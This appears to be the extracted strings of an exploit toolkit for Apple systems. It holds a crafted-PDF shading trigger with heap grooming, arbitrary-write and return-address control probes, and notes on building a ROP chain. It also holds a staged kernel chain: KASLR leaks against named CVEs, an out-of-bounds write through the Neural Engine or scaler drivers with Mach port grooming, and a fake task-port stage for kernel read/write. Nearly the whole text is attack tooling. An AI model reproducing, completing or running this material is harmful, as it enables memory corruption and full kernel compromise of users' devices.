+[112611micro] [%2d] %-24s far=0x%016llx %s%s
+[112611micro] [%2d] %-24s no crash
+[112611micro] === done: %d user-space, %d consecutive same far ===
+[112611pc] === PC diagnostic (R=8) ===
+[112611pc] no crash (rc=%d)
+[112611pc] sig=%d far=0x%016llx pc=0x%016llx lr=0x%016llx
+[112611pc] pc in lib: %s
+[112611pc] pc base: %p  offset: 0x%llx
+[112611pc] dladdr(pc) FAILED
+[112611pc] far in lib: %s base=%p off=0x%llx
+[112611pc] far is NOT in a known library (heap/anon)
+[112611pc] instruction bytes @ pc-16:
+  +0x%02x:
+ %02x
+[112611pc] mach_vm_read_overwrite(pc) failed: 0x%x
+[112611groom] === groom near far ===
+[112611groom] baseline failed (rc=%d)
+[112611groom] baseline far=0x%016llx
+[112611groom] NOTE: same-process groom requires restart.
+[112611groom] Next launch: baseline once, then groom
+[112611rmicro] === R micro sweep (1..20) ===
+[112611rmicro] R=%-2d sig=%d far=0x%016llx pc=0x%016llx %s%s
+[112611rmicro] R=%-2d no crash
+[112611nc] === R x nc sweep ===
+Gray
+CMYK
+NJ_SHADING_CS
+[112611nc] %-4s R=%-2d(nc=%d) far=0x%016llx pc=0x%016llx %s
+[112611nc] %-4s R=%-2d(nc=%d) no crash
+[112611fmap] === fixed-map groom v2 (mach_vm_allocate) ===
+[112611fmap] baseline failed (rc=%d)
+[112611fmap] baseline far=0x%016llx
+[112611fmap] mach_vm_allocate: %d mapped, %d failed
+[112611fmap] all failed 
+ fallback to VM_FLAGS_ANYWHERE
+[112611fmap] fallback mapped: %zu
+[112611fmap] rerender far=0x%016llx (was 0x%016llx)
+[112611fmap] !! far CHANGED after groom
+[112611fmap] CORRUPTION at 0x%llx +0x%x: 0x%016llx
+[112611fmap] result: %d/%zu corrupted
+[112611mg] === malloc groom ===
+[112611mg] baseline failed
+[112611mg] baseline far=0x%016llx
+[112611mg] allocated %zu blocks
+[112611mg] rerender far=0x%016llx (was 0x%016llx)
+[112611mg] CORRUPTION size=%zu block[%zu] +0x%x
+[112611mg] ...more elided
+[112611mg] result: %d/%zu corrupted
+[112611corr] === far correlate + VM probe ===
+[112611corr] created %d CGBitmapContexts (each %zu bytes)
+[112611corr]   ctx[%d] base=%p
+[112611corr] render did not crash (rc=%d)
+[112611corr] far=0x%016llx pc=0x%016llx lr=0x%016llx
+[112611corr]   far - ctx[%d].base = %lld (0x%llx)
+IOSurfaceWidth
+IOSurfaceHeight
+IOSurfaceBytesPerElement
+[112611corr]   far - IOSurface.base = %lld (0x%llx)
+[112611corr]   far - CG base = %lld (0x%llx)
+[112611corr]   CG base=0x%llx pc-offset=0x%llx
+[112611corr] === VM region probe ===
+[112611corr] region: base=0x%llx size=0x%llx prot=%d/%d shared=%d
+[112611corr] region: far-offset=0x%llx
+[112611corr] vm_region_64 FAILED: kr=0x%x
+[112611corr] === kernel-side read probe ===
+[112611corr] !! READ OK far%+lld (%llu bytes):
+[112611corr]   +0x%02x: 0x%016llx
+[112611corr]    read far%+lld FAILED: kr=0x%x got=%llu
+[112611corr] === try mach_vm_protect(far, RW) ===
+[112611corr] mach_vm_protect(0x%llx, RW) kr=0x%x
+[112611corr] !! AFTER PROTECT: READ OK (%llu bytes):
+[112611corr] AFTER PROTECT: read still fails kr=0x%x
+[112611corr] done 
+ compare diffs/probes across runs
+[112611hijack] === far hijack attempt ===
+[112611hijack] baseline failed (rc=%d)
+[112611hijack] far=0x%016llx page=0x%llx
+[112611hijack] attempt A: mach_vm_allocate(FIXED, far_page, 16KB)
+[112611hijack]   allocate: kr=0x%x, addr=0x%llx
+[112611hijack]   read far after alloc: kr=0x%x got=%llu
+[112611hijack] !! READ OK: %02x %02x %02x %02x %02x %02x %02x %02x
+[112611hijack] !! If all 0x41 
+ page hijacked successfully!
+[112611hijack] !! RE-RENDER OK 
+ no crash! Read primitive!
+[112611hijack]   re-render crashed at 0x%llx (was 0x%llx)
+[112611hijack] attempt B: mach_vm_allocate(FIXED, far_page-16KB, 64KB)
+[112611hijack] attempt C: skipped (vm_remap needs header)
+[112611hijack] attempt D: scan 16 pages before/after far for boundaries
+[112611hijack]   page%+lld 0x%llx: region=0x%llx+0x%llx prot=%d/%d
+[112611hijack]   page%+lld 0x%llx: VM_REGION kr=0x%x
+[112611hijack] done
+[112611try] === try all hijack methods ===
+[112611try] baseline failed (rc=%d)
+[112611try] far=0x%016llx page=0x%llx
+[112611try] method 1: mach_vm_map(FIXED, MEMORY_OBJECT_NULL)
+[112611try]   mach_vm_map: kr=0x%x addr=0x%llx
+[112611try] !! METHOD 1 SUCCESS
+[112611try] method 2: vm_remap(source 
+ far_page)
+[112611try]   vm_remap: kr=0x%x target=0x%llx
+[112611try] !! METHOD 2 SUCCESS
+[112611try]   vm_allocate source failed: kr=0x%x
+[112611try] method 3: madvise(MADV_WILLNEED)
+[112611try]   madvise returned %d (errno=%d)
+[112611try]   read after madvise: kr=0x%x got=%llu
+[112611try] !! METHOD 3 SUCCESS
+[112611try] method 4: mmap(MAP_FIXED) via syscall
+[112611try]   mmap returned %p (MAP_FAILED=%p)
+[112611try] !! METHOD 4 SUCCESS
+[112611try] all methods failed
+[112611r1] === R=1 C0 sweep ===
+[112611r1] C0=0x%016llx far=0x%016llx pc=0x%016llx %s%s%s%s
+<<C0-low
+<<C0-high
+[112611r1] C0=0x%016llx no crash
+[112611r1] === done: %d user-space far / %d C0 variants ===
+[112611var] === variants sweep (R=8) ===
+bpc=1
+bpc=2
+bpc=4
+bpc=8 (base)
+bpc=16
+bpc=32
+decode=1
+decode=1000
+decode=100000
+C0=+Inf
+C0=-Inf
+C0=+NaN
+C0=+denorm min
+C0=+denorm max
+C0=+tiny norm
+C0=+huge
+bpc=32 decode=1
+bpc=1 decode=1
+NJ_SHADING_BPC
+[112611var] %-18s build fail
+[112611var] %-18s far=0x%016llx pc=0x%016llx %s%s
+[112611var] %-18s no crash
+[112611var] === done ===
+[112611lr] === LR scan (looking for RIP control) ===
+[112611lr] R=%-4d sig=%d far=0x%016llx lr=0x%016llx pc=0x%016llx sp=0x%016llx%s
+ <<< MARK IN LR/PC!
+[112611lr] !! RIP CONTROL at R=%d: lr/pc contains MARK
+[112611lr] R=%-4d no crash
+[112611lr] === result: found_rip=%d at R=%d ===
+[112611pivot] === stack pivot: target=0x%016llx ===
+[112611pivot] NOTE: run LR-scan first to find R with control flow
+[112611pivot] For now, just verifies target is a valid pointer
+[112611pivot] target not in user space (0x%llx)
+[112611pivot] target looks valid
+[112611geo] === geometry sweep (R=8, vary decode/coord) ===
+dec=200 coord=0x10000000 bpc=8
+dec=1 coord=0x10000000 bpc=8
+dec=4096 coord=0x10000000 bpc=8
+dec=200 coord=0x1 bpc=8
+dec=200 coord=0x7FFFFFFF bpc=8
+dec=200 coord=0x10000000 bpc=1
+dec=200 coord=0x10000000 bpc=32
+[112611geo] %-40s far=0x%016llx pc=0x%016llx %s
+[112611geo] %-40s no crash
+[112611mr] === manual R test: R=%u C0=0x%016llx C1=0x%016llx ===
+[112611mr] CRASH sig=%d
+[112611mr]   far=0x%016llx lr=0x%016llx pc=0x%016llx
+[112611mr] no crash rc=%d
+[112611lr] === LR scan v2 (one render per launch) ===
+%s/nj_lr_scan.state
+[112611lr] launch idx=%d/%d R=%d
+[112611lr] PDF build failed
+[112611lr] rendering R=%d pdf=%zu bytes
+[112611lr] R=%d CRASH sig=%d
+[112611lr]   far=0x%016llx lr=0x%016llx pc=0x%016llx sp=0x%016llx
+[112611lr] no RIP control at R=%d (try next launch, next R=%d)
+[112611lr] R=%d no crash (patched / trigger off)
+[112611lr] R=%d render refused (torn)
+[112611lg4] === LR scan v4 (R=1.., minimal VLA) ===
+%s/nj_lr_v4.state
+[112611lg4] launch idx=%d/%d R=%d
+NJ_SHADING_VPR
+[112611lg4] build failed
+[112611lg4] rendering R=%d pdf=%zu
+[112611lg4] R=%-4d far=0x%016llx lr=0x%016llx pc=0x%016llx sp=0x%016llx %s%s%s%s%s%s
+[STACK]
+[HEAP]
+[OTHER]
+[NULLish]
+[112611lg4] R=%-4d no crash (trigger off)
+[112611lg4] R=%-4d render refused rc=%d
+[112611lv] === LR scan VLA size (R=8) ===
+bpc=32 vpr=2 (base)
+bpc=16 vpr=2
+bpc=32 vpr=1
+bpc=16 vpr=1 (minimal)
+%s/nj_lr_vla.state
+[112611lv] launch idx=%d/%d %s
+[112611lv] build failed
+[112611lv] rendering bpc_coord=%d
+[112611lv] CRASH sig=%d
+[112611lv]   far=0x%016llx lr=0x%016llx pc=0x%016llx sp=0x%016llx
+[112611lv] no RIP control at %s (next idx=%d)
+[112611lv] no crash (rc=%d)
+[112611ufh2] === user-space far hijack v2 ===
+[112611ufh2] no crash rc=%d
+[112611ufh2] far=0x%llx not user
+[112611ufh2] far=0x%016llx
+[112611ufh2] method A: mach_vm_protect(RW)
+[112611ufh2]   protect kr=0x%x
+[112611ufh2] !! READ OK after protect: got=%llu
+[112611ufh2]   +0x%02zx = 0x%016llx
+[112611ufh2] read after protect failed kr=0x%x
+[112611ufh2] method B: mach_vm_remap
+[112611ufh2]   remap kr=0x%x tgt=0x%llx
+[112611ufh2] !! READ OK after remap: %02x %02x %02x %02x
+[112611ufh2] method C: mmap(MAP_FIXED)
+[112611ufh2]   mmap=%p
+[112611ufh2] !! READ OK after mmap: %02x %02x %02x %02x
+[112611ufh2] all methods failed 
+ far in reserved prot=0 VMA
+[112611fdr2] === far direct read v2 ===
+[112611fdr2] test%d rc=%d
+[112611fdr2] test%d far=0x%llx (not user)
+[112611fdr2] test%d far=0x%llx protect=0x%x
+[112611fdr2] test%d read aligned=0x%llx kr=0x%x got=%llu
+[112611fdr2]   +0x%02zx = 0x%016llx
+[112611i16] === 16-bit increment probe ===
+[112611i16] render rc=%d far=0x%016llx
+[112611i16] groom[%d] +0x%zx: 0x%02x (was 0xAB) delta=%+d
+[112611i16]   bytes: %02x %02x (adjacent)
+[112611i16] ...elided
+[112611i16] result: %d/%d buffers modified
+[112611wc] === width control (alloca vs malloc) ===
+dec=200 vpr=2 (base)
+dec=100 vpr=2
+dec=1000 vpr=2
+dec=4096 vpr=2 (heap?)
+dec=200 vpr=8
+dec=200 vpr=16
+dec=200 vpr=32
+[112611wc] %-24s far=0x%016llx sp=0x%016llx %s%s
+[112611wc] %-24s rc=%d
+[112611cos] === coord offset sweep ===
+[112611cos] coord=0x%08x far=0x%016llx low16=0x%04x %s%s
+<<CHANGED
+[112611cos] coord=0x%08x rc=%d
+[112611cos] done 
+ compare low16 values
+[112611sp] === stack probe (R=8, user far) ===
+[112611sp] no crash rc=%d
+[112611sp] far=0x%016llx sp=0x%016llx lr=0x%016llx pc=0x%016llx
+[112611sp] far - sp = %+lld (0x%llx)
+[112611sp] !! far is NEAR SP 
+ likely stack!
+[112611sp] stack read OK got=%llu
+[112611sp]   +0x%02zx = 0x%016llx
+[112611sp] far is NOT near sp 
+ heap/other
+clamp
+a136
+a144
+a152
+a160
+a168
+a176
+a184
+a192
+a200
+a208
+a216
+a224
+a232
+b136
+b144
+b152
+b160
+b176
+b200
+none
+n136
+n144
+n152
+n160
+n176
+n200
+c136
+c144
+c152
+c160
+c176
+c200
+cb136
+cb152
+cb176
+d100
+d144_8
+d152_8
+e_bpc16
+e_dec4096
+e_coord
+%s/v%02d_%s.pdf
+4096
+20000000
+[batch] build fail v%02d
+[batch] generated %d/%d pdfs in %s
+%s/nj_batch_idx
+%s/nj_batch_results.txt
+[batch] no %s -> run init first
+.pdf
+[batch] no pdfs found
+[batch] === BATCH DONE: all %d pdfs rendered. See %s ===
+%s/%s
+[batch] open fail %s
+[batch] === [%d/%d] %s (%ld bytes) ===
+[batch] rc=%d sig=%d far=0x%016llx pc=0x%016llx lr=0x%016llx %s%s%s
+[MARK-FAR]
+[MARK-LR]
+[MARK-PC]
+[batch]   no trigger
+[batch]   !! PAYLOAD CONTROL via %s
+%02d %s rc=%d sig=%d far=0x%016llx pc=0x%016llx lr=0x%016llx groom=%d %s%s%s
+NJ_SHADING_MARK_IDX
+NJ_SHADING_GROOM_SZ
+[112611] groomed %d x %zu bytes
+[112611] CG already torn by earlier crash -- render refused (resume next launch)
+0123456789abcdef
+%s/nj_shading_crash.log
+[112611] CORRUPTION groom[%d] @+0x%lx byte=0x%02x exp=0x%02x
+[112611]   +0x%03lx = 0x%016llx
+[112611] ...more corruptions elided
+[112611] corruption scan: %d/%d groom buffers modified
+NJ_SHADING_PROBE_IDXS
+[112611w] === arbitrary-write probe: %d indices, target=live buffer ===
+[112611w] idx=%-3d CRASH sig=%d far=0x%016llx target=0x%llx
+[112611w] idx=%-3d NO-CRASH, target MODIFIED @+0x%lx%s -> ARBITRARY WRITE!
+ (1.0 doubles present)
+[112611w] idx=%-3d no crash, target intact -> mesh_ptr deref is READ-only (still controlled ptr)
+[112611w] idx=%-3d rc=%d
+[112611w] abw probe done: %d write-slots, %d read-only-controlled of %d
+[112611w] NEXT: pick a write-slot idx, aim at a spray target -> arbitrary controlled write primitive
+[112611aim] === AIM probe: %d target addr candidates, R=%d ===
+[112611aim] T=0x%016llx canonical=%d -> C0=%.17g bits=0x%016llx %s
+(C0 DENORMAL -> trigger OFF)
+(C0 normal -> trigger ON)
+[112611aim]   build fail
+[112611aim]   rc=-2 CG torn -> stop (resume next launch)
+[112611aim]   rc=%d sig=%d far=0x%016llx %s
+<<FAULT AT TARGET (aim OK)
+<<faulted but NOT at target
+<<no trigger (C0 subnormal?)
+[112611aim] NOTE: if only non-canonical T crash, aim exists but cannot deref real user memory (<2^52) because that needs subnormal C0 (trigger off)
+0.25
+0.75
+0.125
+0.9375
+2.0->clamp1
+NJ_SHADING_C0_LIMIT
+%s/nj_c0_sweep.state
+[112611c] === C0 sweep: %d values, R=%d, C1=C0 (Range CLAMPED [0 1]); this launch k=%d..%d (limit %d)%s ===
+ [FULL]
+ [RESUME]
+%s/nj_c0_fars.txt
+[112611c] C0=%s build fail
+[112611c] CG torn after crash (data in nj_shading_crash.log) -> resume at k=%d next launch
+%d 0x%016llx
+[112611c] C0=%-12s bits=0x%016llx rc=%d sig=%d crashed=%d far=0x%016llx pc=0x%016llx lr=0x%016llx %s%s
+<<FAR-CHANGED
+[112611c] NO CRASHES in any C0 config => trigger disabled; experiment VOID (check geometry/R)
+[112611c] !! FAR DEPENDS ON clamped C0/C1 (within launch) => color double drives pointer base
+[112611c] this launch: single crash, far=0x%016llx (cross-launch verdict below once sweep completes)
+%d 0x%llx
+[112611c] === CROSS-LAUNCH verdict: %d configs recorded, %d distinct far, first=0x%016llx ===
+[112611c] !! FAR DEPENDS ON C0 across %d configs => READ PRIMITIVE candidate (color double => pointer base)
+[112611c] far INVARIANT across %d configs (all 0x%016llx) => 2^-16 is a CG constant, not C0
+[112611c] not enough configs recorded (%d) for verdict
+[112611c] more configs pending: relaunch to resume (next k=%d)
+[112611g] === geometry probe: %d configs, R=%d ===
+NJ_SHADING_T
+[112611g] cfg%d build fail
+[112611g] cfg%d dec=%d coord=0x%x t=0x%x bpc=%d cs=%s rc=%d far=0x%016llx d=%.17g %s
+gray
+<<BASE-MOVED
+[112611g] !! fault base DEPENDS on geometry -- tunable toward valid addr
+[112611g] fault base INVARIANT across geometry (min/max/coord/t)
+[112611p] === OOB slot probe: %d indices, mark=0x%016llx ===
+[112611p] baseline(all=1.0) rc=%d far=0x%016llx
+[112611p] idx=%-3d rc=%d sig=%d far=0x%016llx pc=0x%016llx %s%s
+<<MARK-IN-FAR
+[far-changed]
+[112611p] !! CONTROLLED SLOT: idx=%d writes the faulting pointer!
+[112611p] probe done: %d controlled, %d far-changed of %d
+%s/nj_payload_sweep.state
+[112611pl] === payload probe: cfg %d/%d R=%d range=%s mark=0x%016llx%s ===
+[112611pl] cfg%d build fail
+[112611pl] CG torn -> resume at cfg%d next launch
+[112611pl] cfg%d R=%d range=%-5s rc=%d sig=%d far=0x%016llx lr=0x%016llx %s%s%s
+[112611pl]   no trigger with range=%s (range gate kills trigger)
+[112611pl] !! PAYLOAD CONTROL: MARK bits reached fault state at R=%d range=%s
+[112611pl] payload sweep complete -> state reset to 0
+NJ_SHADING_R_LIMIT
+%s/nj_r_sweep.state
+[112611s] === R sweep, mark=0x%016llx; this launch k=%d..%d (limit %d)%s ===
+[112611s] R=%-4d build fail
+[112611s] CG torn after crash -> persist resume k=%d next launch
+[112611s] R=%-4d rc=%d sig=%d far=0x%016llx lr=0x%016llx %s%s%s
+[112611s] !! RIP-CONTROL: saved lr/pc overwritten with MARK at R=%d
+[112611s] sweep done: %d/%d far-MARK (first@R=%d), %d/%d rip-control (first@R=%d)
+[112611s] NEXT: lock R=%d, replace MARK with a real userland gadget/target, build ROP
+[112611s] full sweep complete -> state reset to 0 (next launch restarts at R=136)
+--nj-shading-test
+[112611] posix_spawn failed: rc=%d (%s)
+[112611] spawned child pid=%d, waiting up to 15s...
+[112611] child timeout -> kill, assume vuln
+[112611] child died sig %d -> VULNERABLE (pre-27.2)
+[112611] child exit=%d -> %s
+clean render (patched/27.2+)
+render error
+[112611] in-process detection (sigsetjmp recovery)
+[112611] render R=%d vs nc=1 pdf=%zu bytes
+NULL
+HEAP/STACK
+[112611] CRASH sig=%d addr=0x%llx class=%s -> VULNERABLE
+[112611] render OK (no crash)
+[112611] !! silent corruption w/o crash -- OOB primitive!
+NJ_SHADING_BPC_COORD
+/DeviceGray
+/DeviceRGB
+/DeviceCMYK
+empty
+%s0 1
+%s%.17g %.17g
+%PDF-1.7
+3 0 obj
+<< /Type /Page /Parent 2 0 R /MediaBox [0 0 200 200] /Resources << /Shading << /Sh1 5 0 R >> >> /Contents 4 0 R >>
+endobj
+4 0 obj
+<< /Length 8 >>
+stream
+ /Sh1 sh
+endstream
+endobj
+5 0 obj
+<< /ShadingType 5 /ColorSpace %s /BitsPerCoordinate %d /BitsPerComponent %d /VerticesPerRow %d /Decode [0 %d 0 %d 0 1] /Function 6 0 R /Length %zu >>
+stream
+6 0 obj
+<< /FunctionType 2 /Domain [0 1] /N 1 /C0 [%.*s] /C1 [%.*s] >>
+endobj
+6 0 obj
+<< /FunctionType 2 /Domain [0 1] /N 1 /C0 [%.*s] /C1 [%.*s] /Range [%.*s] >>
+endobj
+xref
+0000000000 65535 f 
+trailer
+<< /Size 7 /Root 1 0 R >>
+startxref
+%%%%EOF
+%s%.17g
+[w86950] shm attach failed
+[w86950] malloc groom dirty=%llu
+[w112611] shm attach failed
+NJ_W_R
+NJ_W_C0
+NJ_W_C1
+NJ_W_PAT
+NJ_W_TARGET_IDX
+NJ_W_TARGET_ADDR
+[w112611] target idx=%d addr=0x%llx R=%d off=0x%llx c0=0x%llx
+[w112611] malloc groom dirty=%llu
+86950
+112611
+[86950cs] === 86950 child-process Tf sweep (shm groom) ===
+[86950cs] shm setup failed: %s
+[86950cs] --- Tf=%s : in-process worker ---
+[86950cs] Tf=%s CRASH sig=%llu far=0x%016llx pc=0x%016llx
+[86950cs] Tf=%s render OK (exit=%d)
+86950cs
+[86950cs] !!! Tf=%s: VERIFIED OOB WRITE into MALLOC groom (%llu dirty bytes, %llu chunks) 
+ real heap write primitive
+[86950cs]    hit[%d] chunk@0x%llx off=0x%llx val=0x%016llx
+[86950cs] !! Tf=%s: OOB WRITE into shared mmap groom (%d dirty bytes)
+[86950cs] === sweep done: crash=%d write=%d ===
+[112611cs] === 112611 child-process sweep (shm groom) ===
+[112611cs] shm setup failed: %s
+[112611cs] --- R=%d : in-process worker ---
+[112611cs] R=%d CRASH sig=%llu far=0x%016llx pc=0x%016llx lr=0x%016llx sp=0x%016llx
+[112611cs] R=%d render OK
+112611cs
+[112611cs] !!! R=%d: VERIFIED OOB WRITE into MALLOC groom (%llu dirty bytes, %llu chunks)
+[112611cs]    hit[%d] chunk@0x%llx off=0x%llx val=0x%016llx
+[112611cs] !! R=%d: OOB WRITE into shared mmap groom (%d dirty bytes)
+%016llx
+[112611cs] --- c0=c1=0x%s R=%d : in-process worker ---
+[112611cs] mark=0x%llx R=%d CRASH far=0x%016llx pc=0x%016llx lr=0x%016llx
+[112611cs] !!! mark=0x%llx: VERIFIED OOB WRITE into MALLOC groom (%llu dirty bytes, %llu chunks)
+[112611cs] !! mark=0x%llx: OOB WRITE into shared mmap groom (%d dirty bytes)
+[112611cs] --- TARGET idx=%d R=%d : in-process worker ---
+[112611cs] TARGET idx=%d R=%d CRASH far=0x%016llx pc=0x%016llx
+[112611cs] TARGET idx=%d R=%d render OK
+[112611cs] *** TARGET idx=%d R=%d: CONTROLLED HEAP WRITE (%llu dirty bytes, %llu chunks) ***
+[112611cs] --- GROOM sweep R=%d : 1MB stride over 64MB region ---
+%llx
+[112611cs] *** GROOM blk=%d R=%d: WRITE LANDED (mg=%llu groom=%d bytes) ***
+[112611cs] === sweep done: crash=%d write=%d ===
+TMPDIR
+nj_oob_groom.bin
+/tmp/%s
+NJ_MG_CHUNK_SZ
+NJ_MG_HOLE_EVERY
+[oob/inproc 112611] target idx=%d addr=0x%llx R=%d off=0x%llx c0=0x%llx
+[oob/inproc %s] malloc groom dirty=%llu chunks=%llu
+[%s] !! GROOM WRITE @shm+0x%zx (user VA %p) len>=%zu bytes: %02x %02x %02x %02x %02x %02x %02x %02x
+[%s] groom scan: %d reported runs, %zu dirty bytes total
+[stage0] === KASLR Leak Stage ===
+[stage0] MOCK MODE: Using fake KASLR values
+[stage0] MOCK: reg=0x%llx surf=0x%llx
+[stage0] 65371 SUCCESS
+[stage0] 65371: FAILED (try lock/unlock screen during attempt)
+[stage0] 84530 SUCCESS
+[stage0] 84530: FAILED
+[stage0] m2scaler SUCCESS
+[stage0] m2scaler: FAILED
+[stage0] At least one KASLR leak succeeded (%d/3)
+[stage0] All KASLR leaks failed
+[stage0] Tip: Set NJ_MOCK_KASLR=1 to use mock values for testing
+NJ_MOCK_KASLR
+[stage0] Attempting CVE-2026-65371 (IOKit gRegistryRoot leak)...
+IODisplayWrangler
+IOConsole
+[stage0] 65371: no IODisplayWrangler/IOConsole service
+[stage0] 65371: IONotificationPortCreate failed
+IOConsoleSecurityInterest
+[stage0] 65371: AddInterestNotification failed: 0x%x
+newjail.iokit.65371
+[stage0] 65371: waiting (lock/unlock screen to trigger)...
+[stage0] 65371: timeout (need lock/unlock screen)
+[stage0] 65371: gRegistryRoot VA = 0x%llx
+[stage0] Attempting CVE-2026-84530 (AIO kn_sdata leak)...
+[stage0] 84530: kqueue failed: %s
+[stage0] 84530: kqueue fd=%d
+/dev/urandom
+[stage0] 84530: open /dev/urandom failed: %s
+[stage0] 84530: proc_pidfdinfo not available (ENOSYS)
+[stage0] 84530: aio_read failed: %s
+[stage0] 84530: aio_read submitted
+[stage0] 84530: proc_pidfdinfo returned %d (errno=%d)
+[stage0] 84530: proc_pidfdinfo returned %d bytes
+[stage0] 84530: entry %d: filter=%d sdata=0x%llx
+[stage0] 84530: Found kptr at entry %d
+[stage0] 84530: no kernel pointer leaked after all attempts
+[stage0] 84530: aio_workq_entry @ 0x%llx
+[stage0] Attempting m2scaler (IOSurface KVA leak via framework)...
+/System/Library/PrivateFrameworks/IOSurfaceAccelerator.framework/IOSurfaceAccelerator
+[stage0] m2scaler: dlopen IOSurfaceAccelerator failed: %s
+IOSurfaceAcceleratorCreate
+IOSurfaceAcceleratorGetDiag
+[stage0] m2scaler: missing symbols in framework
+[stage0] m2scaler: IOSurfaceAcceleratorCreate rc=0x%x
+[stage0] m2scaler: accel=%p
+[stage0] m2scaler: IOSurfaceAcceleratorGetDiag rc=0x%x
+[stage0] m2scaler: diag entries A=%u B=%u total=%u
+[stage0] m2scaler: rec[%u] ev=0x%x @04=0x%llx @18=0x%llx @20=0x%llx
+[stage0] m2scaler: no KVA in diag
+[stage0] m2scaler: IOSurface KVA = 0x%llx (event=0x%x)
+[stage1] === ANE OOB + Groom Stage ===
+[stage1] Target IOSurface KVA: 0x%llx
+[stage1] ERROR: IOSurface KVA is zero
+[stage1] Child reports corruption confirmed!
+[stage1] Child: heap groom failed
+[stage1] Child: ANE not available on this device
+[stage1] will try ALT-PATH (scaler) below instead
+[stage1] Child: too few IOSurfaces
+[stage1] Child: no corruption detected
+[stage1] Child exit code: %d
+NJ_ANE_ALT_PATH
+scaler
+SCALER
+[stage1] NJ_ANE_ALT_PATH=scaler 
+ skipping ANE, using scaler only
+[stage1] SUCCESS (scaler): victim port 0x%x corrupted
+[stage1] scaler ALT-PATH failed
+[stage1] Falling back to in-process ANE...
+[stage1] SUCCESS: Victim port 0x%x corrupted
+auto
+[stage1] ANE failed; trying scaler ALT-PATH...
+[stage1] SUCCESS (scaler fallback): victim port 0x%x corrupted
+[stage1] ANE OOB failed
+0x%llx
+--nj-ane-test
+[stage1] posix_spawn failed: %s
+[stage1] Spawned ANE child pid=%d, waiting...
+[stage1] Child timeout, killing...
+[stage1] Child died by signal %d
+[stage1] scaler: ALT-PATH (bypasses ANE entitlement)
+[stage1] scaler: framework path failed, trying legacy IOKit...
+IOSurfacePixelFormat
+[stage1] scaler: created %d IOSurfaces
+[stage1] scaler: CORRUPTION detected via ALT-PATH
+[stage1] scaler: no corruption detected
+[stage1] scaler(framework): ALT-PATH via IOSurfaceAccelerator.framework
+[stage1] scaler(framework): IOSurfaceAcceleratorCreate failed 0x%x
+[stage1] scaler(framework): accel=%p
+[stage1] scaler(framework): created %d/%d surface pairs
+NJ_SCALER_BLIT
+[stage1] scaler(framework): blit %d/%d ok
+[stage1] scaler(framework): GetDiag -> 0x%x
+[stage1] scaler(framework): CORRUPTION detected
+[stage1] scaler(framework): no corruption detected
+/System/Library/PrivateFrameworks/IOSurfaceAccelerator.framework/Versions/A/IOSurfaceAccelerator
+/System/Library/PrivateFrameworks/IOSurfaceAccelerator.framework/Versions/A/Resources/IOSADiagnose
+[stage1] iosa: dlopen OK '%s'
+[stage1] iosa: dlopen failed (%s) 
+ will fall back to IOKit
+IOSurfaceAcceleratorBlitSurface
+IOSurfaceAcceleratorRelease
+[stage1] iosa: missing symbols create=%p getdiag=%p
+[stage1] iosa: symbols create=%p getdiag=%p blit=%p release=%p
+[stage1] iosa: diag magic mismatch (0x%08x)
+[stage1] iosa: diag ver=0x%x entries A=%u B=%u total=%d
+[stage1] iosa: rec[%d] ev=0x%x @+%c%x = 0x%llx
+[stage1] iosa: chose IOSurface KVA = 0x%llx (prio=%llu)
+[stage1] iosa: no kernel KVA found in diag buffer
+[stage1] Grooming heap: %d port pairs...
+[stage1] pair %d: mach_port_allocate(h) failed 0x%x
+[stage1] pair %d: insert_right(h) failed 0x%x
+[stage1] pair %d: send_inline(h, size=%d) failed 0x%x
+[stage1] pair %d: mach_port_allocate(v) failed 0x%x
+[stage1] pair %d: insert_right(v) failed 0x%x
+[stage1] pair %d: send_inline(v) failed 0x%x
+[stage1] Created %d/%d port pairs (alloc_fail=%d insert_fail=%d send_fail=%d last=0x%x)
+NJ_ALLOW_GROOM_FAIL
+[stage1] WARNING: too few ports (%d), but NJ_ALLOW_GROOM_FAIL set 
+ continuing anyway
+[stage1] ERROR: Too few ports created (need >= %d, got %d)
+[stage1] Tip: set NJ_ALLOW_GROOM_FAIL=1 to force-continue for testing
+[stage1] Drained %d holes
+AppleM2ScalerCSCDriver
+AppleM2Scaler
+IOSurfaceAccelerator
+AppleS5L8940XScaler
+[stage1] scaler: no AppleM2ScalerCSCDriver (nor variants)
+[stage1] scaler: found '%s' (obj=0x%x)
+[stage1] scaler: IOServiceOpen type=%u OK
+[stage1] scaler: IOServiceOpen failed 0x%x
+[stage1] scaler: triggering with %d surfaces (req_sz=0x%zx)
+[stage1] scaler: sel %d -> 0x%x
+[stage1] Scanning victim ports for corruption...
+[stage1] CORRUPTION DETECTED on victim %d!
+%02x 
+[stage1] Corrupted data: %s
+[stage1] WARNING: Using in-process ANE (less safe)
+[stage1] Invalid IOSurface KVA: 0x%llx
+H11ANEIn
+AppleH11ANEInterface
+H11ANEInDirectPath
+H11ANEInDirectPathClient
+AppleH13ANEIn
+AppleH14ANEIn
+AppleH15ANEIn
+AppleH16ANEIn
+AppleNeuralEngine
+[stage1] Found ANE service '%s' (obj=0x%x)
+NJ_ANE_CLASS
+[stage1] Trying NJ_ANE_CLASS override '%s'
+[stage1] Found ANE service '%s' (via env override)
+IONameMatch
+neural
+cedar
+IOProviderClass
+[stage1] ANE-ish[%d] class=%s provider=%s
+[stage1] ANE-ish[%d] class=%s
+wildcard
+[stage1] Walked %d IOKit nodes, %d ANE-ish match
+[stage1] ANE service not available (no ANE-ish class in IOKit)
+[stage1] Hint: set NJ_ANE_CLASS=<IOClass> to force, or use NJ_ANE_ALT_PATH=scaler|xpc
+[stage1] IOServiceOpen('%s', type=0) failed 0x%x 
+ trying other userclient types...
+[stage1] IOServiceOpen type %u OK
+[stage1] Failed to open ANE client: 0x%x (kIOReturnNotPrivileged=0xe00002c1 
+ sandboxed app w/o entitlement)
+[stage1] Triggering ANE OOB with %d surfaces...
+[stage1] ANE request succeeded (selector %d)
+[stage1] ANE trigger failed (no valid selector)
+[stage1-child] Heap groom failed
+[stage1-child] ANE not available
+[stage1-child] Created %d IOSurfaces
+[stage1-child] Too few surfaces created
+[stage1-child] Corruption confirmed!
+[stage1-child] No corruption detected
+[stage2] === Kernel R/W Stage ===
+[stage2] Building fake task port for tfp0...
+[stage2] This requires prior stages to provide:
+[stage2]   - gRegistryRoot VA (for kernel_task address)
+[stage2]   - IOSurface KVA (for fake port location)
+[stage2]   - Corrupted victim port (from ANE OOB)
+[stage2] Kernel R/W framework ready
+[stage2] Build-specific offsets required for full exploitation
+[stage2] Building KRW from leaked values...
+[stage2] Invalid parameters: reg=%llx surf=%llx port=%x
+[stage2] Warning: unusual kernel slide 0x%llx
+[stage2] Kernel base: 0x%llx
